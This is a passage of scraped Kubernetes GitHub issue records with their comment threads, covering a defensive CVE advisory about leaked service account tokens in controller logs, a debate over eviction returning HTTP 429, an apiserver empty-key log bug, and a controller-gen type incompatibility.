EDT 2025 x86_64 GNU/Linux\n\n```\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "sig/cli", "needs-triage"], "comments": [{"author": "k8s-ci-robot", "body": "This issue is currently awaiting triage.\n\nIf a SIG or subproject determines this is a relevant issue, they will accept it by applying the `triage/accepted` label and provide further guidance.\n\nThe `triage/accepted` label can be added by org members by writing `/triage accepted` in a comment.\n\n\n<details>\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "BenTheElder", "body": "/sig cli"}, {"author": "ardaguclu", "body": "Duplicate of https://github.com/kubernetes/kubectl/issues/1775. Fixed and cherry-picked to 1.34.\n/close"}, {"author": "k8s-ci-robot", "body": "@ardaguclu: Closing this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/133864#issuecomment-3257043832):\n\n>Duplicate of https://github.com/kubernetes/kubectl/issues/1775. Fixed and cherry-picked to 1.34.\n>/close\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133897, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133897", "issue_title": "CVE-2025-7445: secrets-store-sync-controller discloses service account tokens in logs", "issue_author": "enj", "issue_body": "A security issue was discovered in [secrets-store-sync-controller](https://github.com/kubernetes-sigs/secrets-store-sync-controller) where an actor with access to the controller logs could observe service account tokens.  These tokens could then potentially be exchanged with external cloud providers to access secrets stored in cloud vault solutions.  Tokens are only logged when there is a specific error marshaling the `parameters` sent to the providers.\n\nThis issue has been rated MEDIUM [CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) (6.5), and assigned CVE-2025-7445\n\n### Am I vulnerable?\n\nTo check if tokens are being logged, examine the manager container log:\n\n```bash\nkubectl logs -l 'app.kubernetes.io/part-of=secrets-store-sync-controller' -c manager -f | grep --line-buffered \"csi.storage.k8s.io/serviceAccount.tokens\"\n```\n\n### Affected Versions\n\n- secrets-store-sync-controller < v0.0.2\n\n### How do I mitigate this vulnerability?\n\nUpgrade to secrets-store-sync-controller v0.0.2+\n\n### Fixed Versions\n\n- secrets-store-sync-controller >= v0.0.2\n\n\n### Detection\n\nExamine cloud provider logs for unexpected token exchanges, as well as unexpected access to cloud vault secrets.\n\nIf you find evidence that this vulnerability has been exploited, please contact [security@kubernetes.io](https://groups.google.com/)\n\n### Acknowledgements\n\nThis vulnerability was reported by Reem Rotenberg and [Kas Dekel](https://github.com/privmickas) from Microsoft.\n\n/area security\n/kind bug\n/committee security-response\n/label official-cve-feed\n/sig auth\n\n/triage accepted", "issue_labels": ["kind/bug", "area/security", "sig/auth", "committee/security-response", "triage/accepted", "official-cve-feed"], "comments": [{"author": "enj", "body": "Already fixed, https://github.com/kubernetes-sigs/secrets-store-sync-controller/security/advisories/GHSA-rcw7-pqfp-735x"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 106286, "issue_url": "https://github.com/kubernetes/kubernetes/issues/106286", "issue_title": "Confusing use of TooManyRequests error for eviction", "issue_author": "theunrepentantgeek", "issue_body": "### What happened?\r\n\r\nWhen the Kubernetes API server returns a 429 (throttled), the response may include misleading cause information.\r\n\r\nWe observed that a pod eviction API call received a response that included _**both**_ of the following fragments:\r\n\r\n``` json\r\n\"responseStatus\": {\r\n  \"metadata\": {},\r\n  \"status\": \"Failure\",\r\n  \"reason\": \"TooManyRequests\",\r\n  \"code\": 429\r\n},\r\n```\r\n\r\nand\r\n\r\n``` json\r\n\"responseObject\": {\r\n  \"kind\": \"Status\",\r\n  \"apiVersion\": \"v1\",\r\n  \"metadata\": {},\r\n  \"status\": \"Failure\",\r\n  \"message\": \"Cannot evict pod as it would violate the pod's disruption budget.\",\r\n  \"reason\": \"TooManyRequests\",\r\n  \"details\": {\r\n    \"causes\": [\r\n      {\r\n        \"reason\": \"DisruptionBudget\",\r\n        \"message\": \"The disruption budget [elided] needs 11 healthy pods and has 12 currently\"\r\n      }\r\n    ]\r\n  },\r\n  \"code\": 429\r\n},\r\n```\r\nNote that the `message` given above is confusing, as there are more currently healthy pods than the required number.\r\n\r\n\r\n### What did you expect to happen?\r\n\r\nWhen a request is rejected due to throttling (429 HTTP response), either\r\n* no other error information should be included; or\r\n* the included error information should indicate throttling\r\n\r\n### How can we reproduce it (as minimally and precisely as possible)?\r\n\r\nProvoke a 429 HTTP response and inspect the response. \r\n\r\n### Anything else we need to know?\r\n\r\nIssue #88535 seems to be similar - it also describes a 429 response where inclusion of a cause resulted in confusion.\r\n\r\n### Kubernetes version\r\n\r\nVersion: 1.20.9\r\n\r\n\r\n### Cloud provider\r\n\r\nAzure Kubernetes Service\t\r\n\r\n### OS version\r\n\r\n<details>\r\n\r\n```console\r\n# On Linux:\r\n$ cat /etc/os-release\r\n# paste output here\r\n$ uname -a\r\n# paste output here\r\n\r\n# On Windows:\r\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\r\n# paste output here\r\n```\r\n\r\n</details>\r\n\r\n\r\n### Install tools\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Container runtime (CRI) and and version (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n\r\n\r\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\r\n\r\n<details>\r\n\r\n</details>\r\n", "issue_labels": ["kind/bug", "sig/apps", "priority/important-longterm", "triage/accepted"], "comments": [{"author": "theunrepentantgeek", "body": "/sig api-machinery"}, {"author": "liggitt", "body": "/remove-sig api-machinery\r\n/sig apps\r\nfor PDB"}, {"author": "theunrepentantgeek", "body": "@liggitt , are you sure?\r\n\r\nAs far as I've been able to work out, the 429 HTTP response is correct and the PDB error is a red herring. \r\n\r\nThe PDB error we observed doesn't even make sense, given the number of healthy pods (12) was _more_ than the needed (11):\r\n\r\n> The disruption budget [elided] needs 11 healthy pods and has 12 currently\r\n\r\n(My experience is that I spent a bunch of time digging into possible causes of the PDB error before realizing that I'd been ignoring the HTTP response code - and once I started paying attention to that, everything started to make sense. Of course, you understand this area far better, I just don't want you to fall into the same trap that I did!)\r\n"}, {"author": "liggitt", "body": "any message coming back with PDB language in it belongs to sig-apps"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle stale`\n- Mark this issue or PR as rotten with `/lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "theunrepentantgeek", "body": "/remove-lifecycle stale"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle stale`\n- Mark this issue or PR as rotten with `/lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "theunrepentantgeek", "body": "/remove-lifecycle stale "}, {"author": "theunrepentantgeek", "body": "/remove-lifecycle stale"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle stale`\n- Mark this issue or PR as rotten with `/lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough active contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle rotten\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "theunrepentantgeek", "body": "/remove-lifecycle rotten"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues and PRs.\n\nThis bot triages issues and PRs according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue or PR as fresh with `/remove-lifecycle stale`\n- Mark this issue or PR as rotten with `/lifecycle rotten`\n- Close this issue or PR with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "theunrepentantgeek", "body": "/remove-lifecycle stale"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "theunrepentantgeek", "body": "/remove-lifecycle stale"}, {"author": "tallclair", "body": "/triage accepted\r\n/priority important-longterm\r\n\r\nIt looks like eviction has some creative uses of `TooManyRequests` errors. Why is this conflict error converted to TooManyRequests?\r\n\r\nhttps://github.com/kubernetes/kubernetes/blob/786316f0b6bb9078cd564ebf5401bb2e9ac7f2a2/pkg/registry/core/pod/storage/eviction.go#L294-L305\r\n\r\nAlso this observed generation mismatch (stale cache?):\r\n\r\nhttps://github.com/kubernetes/kubernetes/blob/786316f0b6bb9078cd564ebf5401bb2e9ac7f2a2/pkg/registry/core/pod/storage/eviction.go#L419-L422\r\n\r\nViolating the disruption budget is more debatable, but I still don't think a 429 error is right:\r\n\r\nhttps://github.com/kubernetes/kubernetes/blob/786316f0b6bb9078cd564ebf5401bb2e9ac7f2a2/pkg/registry/core/pod/storage/eviction.go#L429-L433\r\n\r\n"}, {"author": "liggitt", "body": "> It looks like eviction has some creative uses of `TooManyRequests` errors. Why is this conflict error converted to TooManyRequests?\r\n\r\nthat was added in https://github.com/kubernetes/kubernetes/pull/94381/files#r507982781 with some discussion there\r\n\r\nI think the short answer is we wanted to drive an automatic retry (which the server returning TooManyRequests with a RetryAfter does), and returning a conflict when the user did not set a precondition on the request did not seem correct"}, {"author": "k8s-triage-robot", "body": "This issue has not been updated in over 1 year, and should be re-triaged.\n\nYou can:\n- Confirm that this issue is still relevant with `/triage accepted` (org members only)\n- Close this issue with `/close`\n\nFor more details on the triage process, see https://www.kubernetes.dev/docs/guide/issue-triage/\n\n/remove-triage accepted"}, {"author": "flavianmissi", "body": "If we put aside the 429 for a moment and focus on the error's cause in question:\r\n```\r\n  \"details\": {\r\n    \"causes\": [\r\n      {\r\n        \"reason\": \"DisruptionBudget\",\r\n        \"message\": \"The disruption budget [elided] needs 11 healthy pods and has 12 currently\"\r\n      }\r\n    ]\r\n  },\r\n```\r\nsource:\r\nhttps://github.com/kubernetes/kubernetes/blob/786316f0b6bb9078cd564ebf5401bb2e9ac7f2a2/pkg/registry/core/pod/storage/eviction.go#L429-L433\r\nIsn't it weird that this state (`needs 11 healthy pods and has 12 currently`) is an error?\r\nThe code returns this error cause when `pdb.Status.DisruptionsAllowed == 0`. Is this value wrong in this case, should it have been 1? I couldn't find how this is calculated but I don't know the code so well."}, {"author": "liggitt", "body": "`pdb.Status.DisruptionsAllowed = 0` is set as a fail safe when the DesiredHealthy / CurrentHealthy pods can't be calculated so those numbers are not trustworthy:\r\n\r\nhttps://github.com/kubernetes/kubernetes/blob/bb838fde5bb9df4becb9fd267c84759be9f5400f/pkg/controller/disruption/disruption.go#L944-L962\r\n\r\nIf the `type=DisruptionAllowedCondition, status=False` condition is present, we should probably use the message from that condition rather than the pdb.Status.DesiredHealthy and pdb.Status.CurrentHealthy fields"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "theunrepentantgeek", "body": "/remove-lifecycle stale"}, {"author": "k8s-triage-robot", "body": "The Kubernetes project currently lacks enough contributors to adequately respond to all issues.\n\nThis bot triages un-triaged issues according to the following rules:\n- After 90d of inactivity, `lifecycle/stale` is applied\n- After 30d of inactivity since `lifecycle/stale` was applied, `lifecycle/rotten` is applied\n- After 30d of inactivity since `lifecycle/rotten` was applied, the issue is closed\n\nYou can:\n- Mark this issue as fresh with `/remove-lifecycle stale`\n- Close this issue with `/close`\n- Offer to help out with [Issue Triage][1]\n\nPlease send feedback to sig-contributor-experience at [kubernetes/community](https://github.com/kubernetes/community).\n\n/lifecycle stale\n\n[1]: https://www.kubernetes.dev/docs/guide/issue-triage/"}, {"author": "theunrepentantgeek", "body": "/lifecycle stale"}, {"author": "c-goes", "body": "/remove-lifecycle stale"}, {"author": "doverk96", "body": "I also came across the same scenario wherein in kube-api-server-audit logs, we see 429 requests but then there is a response as well which says eviction not possible due to PDB. If its 429 & request is rejected, how come this message is appearing in audit logs ?\nEKS version: 1.29\n\n@theunrepentantgeek  Were you able to find out by any chance reason behind it ?"}, {"author": "tallclair", "body": "/triage accepted"}, {"author": "kei01234kei", "body": "I will work on this issue :)\n/assign"}, {"author": "tsipo", "body": "> > It looks like eviction has some creative uses of `TooManyRequests` errors. Why is this conflict error converted to TooManyRequests?\n> \n> that was added in https://github.com/kubernetes/kubernetes/pull/94381/files#r507982781 with some discussion there\n> \n> I think the short answer is we wanted to drive an automatic retry (which the server returning TooManyRequests with a RetryAfter does), and returning a conflict when the user did not set a precondition on the request did not seem correct\n\nMy apologies, @liggitt , I ran into this issue only today trying to understand why my k8s client all of a sudden gets \"rate limited\".\nI disagree not 100% but 1000% with the usage of the 429 HTTP status code here. IMHO this is not a \"creative\" usage of it, but actually an ABUSE of it. It looks like the intelligent API server tries to drive the stupid clients into a certain behaviour, and I am sorry to tell you - it is neither its responsibility nor its job. Let the clients decide what they want to do when requests fail.\nThe reason a pod cannot be evicted due to PDB is a classic [409 Conflict](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/409): `request conflict with the current state of the target resource`. It doesn't matter the client \"did not set a precondition\", this is an excuse, you don't have a 5xx status code to describe conflicts. The only thing you have is 409. This is NEVER EVER a 429.\nIn my case, all I try to do is to perform a pod eviction `in All dry-run mode`, to see if it's possible. If it is, evict the pod.\nI set up a test case with a Deployment of 2 replicas and PDB with min healthy of 2. Maybe stupid, but that's something k8s API gladly allows. The VERY FIRST `/eviction` REQUEST gets a 429 which actually can never be recovered, this will be an endless loop with 429s... Thank you for this, API server.\nIt gets worse if the client uses an HTTP retry library - like [this](https://github.com/hashicorp/go-retryablehttp). These libraries are trained to retry to a **genuine** 429 due to rate-limiting. This required ideally the `Retry-after` HTTP response header (which the current API server doesn't even bother to set).\nSo all I am left with is to have to analyze the response for a 429 (which should never ever have been done as it's not part of the HTTP 429 \"standard\") i.s.o. the response header. This is not ugly, this is FUGLY.\nPlease just return a standard 409 like us mortals would return. Thank you."}]}
{"repo": "kubernetes/kubernetes", "issue_number": 133787, "issue_url": "https://github.com/kubernetes/kubernetes/issues/133787", "issue_title": "stats.go:136 \"Error getting keys\" err=\"empty key: \\\"\\\"\"", "issue_author": "ttc0419", "issue_body": "Keeps getting this error by the api server when using 1.34.0.\n\nkube-apiserver flags:\n```\nkube-apiserver \\\n\t--allow-privileged=true \\\n\t--authorization-mode=Node,RBAC \\\n\t--client-ca-file=/etc/kubernetes/pki/ca.crt \\\n\t--default-not-ready-toleration-seconds=15 \\\n\t--default-unreachable-toleration-seconds=15 \\\n\t--enable-admission-plugins=NodeRestriction \\\n\t--enable-bootstrap-token-auth=true \\\n\t--etcd-servers=unix:///run/etcd.sock \\\n\t--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key \\\n\t--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt \\\n\t--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-client.crt \\\n\t--requestheader-extra-headers-prefix=X-Remote-Extra- \\\n\t--requestheader-group-headers=X-Remote-Group \\\n\t--requestheader-username-headers=X-Remote-User \\\n\t--service-account-issuer=https://kubernetes.default.svc.cluster.local \\\n\t--service-account-key-file=/etc/kubernetes/pki/sa.pub \\\n\t--service-account-signing-key-file=/etc/kubernetes/pki/sa.key \\\n\t--service-cluster-ip-range=xxx \\\n\t--tls-cert-file=/etc/kubernetes/pki/apiserver.crt \\\n\t--tls-private-key-file=/etc/kubernetes/pki/apiserver.key\n```", "issue_labels": ["kind/bug", "triage/accepted", "sig/etcd"], "comments": [{"author": "KayenM", "body": "I'm seeing the same error in my api-server logs after creating a cluster on Kubernetes v1.34.0. It originates from this [cleanKeysIfNeeded method](https://github.com/kubernetes/kubernetes/blob/0a558779794cd9d26bfa625a1bcf15e9c572cb9e/staging/src/k8s.io/apiserver/pkg/storage/etcd3/stats.go#L136).\n\n[Commit](https://github.com/kubernetes/kubernetes/pull/132355) shows this method is new to v1.34.0."}, {"author": "BenTheElder", "body": "/sig etcd\ncc @serathius "}, {"author": "Avinaba-Bhattacharjee", "body": "Any steps to recreate this? @ttc0419 / @KayenM "}, {"author": "ttc0419", "body": "> Any steps to recreate this? [@ttc0419](https://github.com/ttc0419) / [@KayenM](https://github.com/KayenM)\n\nYou should be able to re produce this issue with the api-server flags pretty easily."}, {"author": "pacoxu", "body": "The default kubeadm installed cluster will should this log 2 times every minutes.\n```\nI0831 23:31:20.307973       1 stats.go:136] \"Error getting keys\" err=\"empty key: \\\"\\\"\"\nI0831 23:32:11.197074       1 stats.go:136] \"Error getting keys\" err=\"empty key: \\\"\\\"\"\nI0831 23:32:21.189860       1 stats.go:136] \"Error getting keys\" err=\"empty key: \\\"\\\"\"\nI0831 23:33:20.638726       1 stats.go:136] \"Error getting keys\" err=\"empty key: \\\"\\\"\"\nI0831 23:33:33.088748       1 stats.go:136] \"Error getting keys\" err=\"empty key: \\\"\\\"\"\nI0831 23:34:35.953975       1 stats.go:136] \"Error getting keys\" err=\"empty key: \\\"\\\"\"\nI0831 23:34:42.057313       1 stats.go:136] \"Error getting keys\" err=\"empty key: \\\"\\\"\"\n```\n\n/kind bug\n"}, {"author": "serathius", "body": "/assign\n"}, {"author": "serathius", "body": "Guessing this is executed by storages created for non-resource purpose."}, {"author": "serathius", "body": "Found that there resources like `masterleases` uses keys like `/masterleases/192.168.0.1`, but does not prefix, and refers to them with full path. This means that storage is constructed on empty path."}, {"author": "serathius", "body": "Generated list of all resources and their prefix:\n\n| Prefix                                          | Resource                                                       | API Group                    |\n|:------------------------------------------------|:---------------------------------------------------------------|:-----------------------------|\n| /mutatingwebhookconfigurations                  | mutatingwebhookconfigurations.admissionregistration.k8s.io     | admissionregistration.k8s.io |\n| /validatingadmissionpolicies                    | validatingadmissionpolicies.admissionregistration.k8s.io       | admissionregistration.k8s.io |\n| /validatingadmissionpolicybindings              | validatingadmissionpolicybindings.admissionregistration.k8s.io | admissionregistration.k8s.io |\n| /validatingwebhookconfigurations                | validatingwebhookconfigurations.admissionregistration.k8s.io   | admissionregistration.k8s.io |\n| /apiextensions.k8s.io/customresourcedefinitions | customresourcedefinitions.apiextensions.k8s.io                 | apiextensions.k8s.io         |\n| /apiregistration.k8s.io/apiservices             | apiservices.apiregistration.k8s.io                             | apiregistration.k8s.io       |\n| /controllerrevisions                            | controllerrevisions.apps                                       | apps                         |\n| /daemonsets                                     | daemonsets.apps                                                | apps                         |\n| /deployments                                    | deployments.apps                                               | apps                         |\n| /replicasets                                    | replicasets.apps                                               | apps                         |\n| /statefulsets                                   | statefulsets.apps                                              | apps                         |\n| /horizontalpodautoscalers                       | horizontalpodautoscalers.autoscaling                           | autoscaling                  |\n| /cronjobs                                       | cronjobs.batch                                                 | batch                        |\n| /jobs                                           | jobs.batch                                                     | batch                        |\n| /certificatesigningrequests                     | certificatesigningrequests.certificates.k8s.io                 | certificates.k8s.io          |\n| /leases                                         | leases.coordination.k8s.io                                     | coordination.k8s.io          |\n|                                                 | apiServerIPInfo                                                | core                         |\n| /configmaps                                     | configmaps                                                     | core                         |\n| /services/endpoints                             | endpoints                                                      | core                         |\n| /events                                         | events                                                         | core                         |\n| /events                                         | events                                                         | core                         |\n| /limitranges                                    | limitranges                                                    | core                         |\n| /namespaces                                     | namespaces                                                     | core                         |\n| /minions                                        | nodes                                                          | core                         |\n| /persistentvolumeclaims                         | persistentvolumeclaims                                         | core                         |\n| /persistentvolumes                              | persistentvolumes                                              | core                         |\n| /pods                                           | pods                                                           | core                         |\n| /podtemplates                                   | podtemplates                                                   | core                         |\n| /controllers                                    | replicationcontrollers                                         | core                         |\n| /resourcequotas                                 | resourcequotas                                                 | core                         |\n| /secrets                                        | secrets                                                        | core                         |\n| /serviceaccounts                                | serviceaccounts                                                | core                         |\n| /serviceaccounts                                | serviceaccounts                                                | core                         |\n|                                                 | servicenodeportallocations                                     | core                         |\n| /services/specs                                 | services                                                       | core                         |\n| /endpointslices                                 | endpointslices.discovery.k8s.io                                | discovery.k8s.io             |\n| /flowschemas                                    | flowschemas.flowcontrol.apiserver.k8s.io                       | flowcontrol.apiserver.k8s.io |\n| /prioritylevelconfigurations                    | prioritylevelconfigurations.flowcontrol.apiserver.k8s.io       | flowcontrol.apiserver.k8s.io |\n| /ingressclasses                                 | ingressclasses.networking.k8s.io                               | networking.k8s.io            |\n| /ingress                                        | ingresses.networking.k8s.io                                    | networking.k8s.io            |\n| /ipaddresses                                    | ipaddresses.networking.k8s.io                                  | networking.k8s.io            |\n| /networkpolicies                                | networkpolicies.networking.k8s.io                              | networking.k8s.io            |\n| /servicecidrs                                   | servicecidrs.networking.k8s.io                                 | networking.k8s.io            |\n| /runtimeclasses                                 | runtimeclasses.node.k8s.io                                     | node.k8s.io                  |\n| /poddisruptionbudgets                           | poddisruptionbudgets.policy                                    | policy                       |\n| /clusterrolebindings                            | clusterrolebindings.rbac.authorization.k8s.io                  | rbac.authorization.k8s.io    |\n| /clusterroles                                   | clusterroles.rbac.authorization.k8s.io                         | rbac.authorization.k8s.io    |\n| /rolebindings                                   | rolebindings.rbac.authorization.k8s.io                         | rbac.authorization.k8s.io    |\n| /roles                                          | roles.rbac.authorization.k8s.io                                | rbac.authorization.k8s.io    |\n| /deviceclasses                                  | deviceclasses.resource.k8s.io                                  | resource.k8s.io              |\n| /resourceclaims                                 | resourceclaims.resource.k8s.io                                 | resource.k8s.io              |\n| /resourceclaimtemplates                         | resourceclaimtemplates.resource.k8s.io                         | resource.k8s.io              |\n| /resourceslices                                 | resourceslices.resource.k8s.io                                 | resource.k8s.io              |\n| /priorityclasses                                | priorityclasses.scheduling.k8s.io                              | scheduling.k8s.io            |\n| /stable.example.com/crontabs                    | crontabs.stable.example.com                                    | stable.example.com           |\n| /csidrivers                                     | csidrivers.storage.k8s.io                                      | storage.k8s.io               |\n| /csinodes                                       | csinodes.storage.k8s.io                                        | storage.k8s.io               |\n| /csistoragecapacities                           | csistoragecapacities.storage.k8s.io                            | storage.k8s.io               |\n| /storageclasses                                 | storageclasses.storage.k8s.io                                  | storage.k8s.io               |\n| /volumeattachments                              | volumeattachments.storage.k8s.io                               | storage.k8s.io               |\n| /volumeattributesclasses                        | volumeattributesclasses.storage.k8s.io                         | storage.k8s.io               |"}, {"author": "serathius", "body": "Long term all resources should set a proper prefix because it's incorrect to assume that they are singleton storage.\n \nFor a fix I would just disable measuring stats for resources that don't set it now: `apiServerIPInfo` `servicenodeportallocations`.\n\nConsequences:\n* No `apiserver_resource_size_estimate_bytes` metric for those resources.\n* APF might overestimate cost of LIST request for those resources. However I don't think they are exposed in API."}, {"author": "maksat-yskak", "body": "> --service-cluster-ip-range=xxx \\\n\nAre you changing this or using xxx? I have HAProxy and wrote wrong backend control plane IPs. Had same error as yours. If init fails only when running healthcheck kube-apiserver, and previous checks pass. then you maybe you also misconfigured something."}, {"author": "BenTheElder", "body": "It's just a placeholder value, see above for the discussion of the bug here which was fixed.\n/triage accepted"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 124201, "issue_url": "https://github.com/kubernetes/kubernetes/issues/124201", "issue_title": "api: v1.KubeSchedulerConfiguration Go type is not compatible with controller-gen", "issue_author": "ahmetb", "issue_body": "## What would you like to be added?\r\n\r\nI am using the `kubescheduler.config.k8s.io/v1.KubeSchedulerConfiguration` type as a field in my CustomResourceDefinition. However, when I try to generate CRD manifests from the Go type for the CRD using the command I get various errors.\r\n\r\n## Why is this needed\r\n\r\nI'm curious if this use case is supported. It can help projects like kubeadm, [Cluster API](https://cluster-api.sigs.k8s.io/) or [Kamaji](https://kamaji.clastix.io/) accept KubeSchedulerConfiguration objects as a field to customize the provisioned cluster's kube-scheduler config differently between clusters. The only other option to do so is to either deal with `runtime.RawExtensions` or use a YAML/JSON stored as `string`.\r\n\r\n## Errors from `controller-gen crd`\r\n\r\nWhen I use the `controller-gen crd` command to generate CustomResourceDefinition manifests for a Go type that has a struct member of type KubeSchedulerConfiguration, I get errors about float types (presumably QPS/Burst) in the `componentbaseconfigv1alpha1.ClientConnectionConfiguration`:\r\n\r\n> `\r\n/Users/abalkan/go-athens/pkg/mod/k8s.io/component-base@v0.29.1/config/v1alpha1/types.go:79:6: found float, the usage of which is highly discouraged, as support for them varies across languages. Please consider serializing your float as string instead. If you are really sure you want to use them, re-run with crd:allowDangerousTypes=true`\r\n\r\nAnd a few errors about various [[]byte fields](https://github.com/kubernetes/kube-scheduler/blob/94ff27f8b9eb26561417aa148314397395e6faef/config/v1/types.go#L385-L396) that have `+listType=atomic`:\r\n\r\n> `/Users/abalkan/go-athens/pkg/mod/k8s.io/kube-scheduler@v0.29.1/config/v1/types.go:388:2: must apply listType to an array, found string`\r\n\r\n> `/Users/abalkan/go-athens/pkg/mod/k8s.io/kube-scheduler@v0.29.1/config/v1/types.go:392:2: must apply listType to an array, found string`\r\n\r\n> `/Users/abalkan/go-athens/pkg/mod/k8s.io/kube-scheduler@v0.29.1/config/v1/types.go:396:2: must apply listType to an array, found string`\r\n\r\n/sig scheduling\r\n/sig api-machinery\r\n/kind bug", "issue_labels": ["kind/bug", "sig/scheduling", "sig/api-machinery", "lifecycle/rotten", "needs-triage"], "comments": [{"author": "kerthcet", "body": "/triage accept"}, {"author": "k8s-ci-robot", "body": "@kerthcet: The label(s) `triage/accept` cannot be applied, because the repository doesn't have them.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/124201#issuecomment-2041301544):\n\n>/triage accept\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the 